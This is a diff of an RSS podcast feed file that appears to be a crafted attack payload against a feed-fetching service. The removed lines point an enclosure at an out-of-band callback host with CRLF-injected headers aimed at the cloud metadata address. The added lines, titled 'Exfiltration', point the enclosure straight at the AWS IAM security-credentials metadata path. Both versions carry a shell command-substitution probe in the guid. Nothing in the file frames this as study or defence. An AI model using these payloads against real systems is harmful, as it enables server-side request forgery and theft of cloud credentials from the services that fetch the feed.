@@ -1,14 +1,11 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<rss xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" version="2.0">
+<rss version="2.0">
   <channel>
-    <title>Security Audit v9</title>
-    <link>http://xrsea31dhrk5ftwqhowh4qstuk0bofc4.oastify.com</link>
-    <language>en-us</language>
+    <title>Critical Impact Test</title>
     <item>
-      <title>Final Step</title>
-      <enclosure url="http://xrsea31dhrk5ftwqhowh4qstuk0bofc4.oastify.com/test.mp3?%0d%0aHost:%20169.254.169.254%0d%0aConnection:%20keep-alive" length="5000" type="audio/mpeg"/>
-      <guid>unique-$(date +%s)</guid>
-      <pubDate>Sat, 11 Apr 2026 00:00:00 GMT</pubDate>
+      <title>Exfiltration</title>
+      <enclosure url="http://169.254.169.254/latest/meta-data/iam/security-credentials/" length="5000" type="audio/mpeg"/>
+      <guid>exploit-$(date +%s)</guid>
     </item>
   </channel>
 </rss>
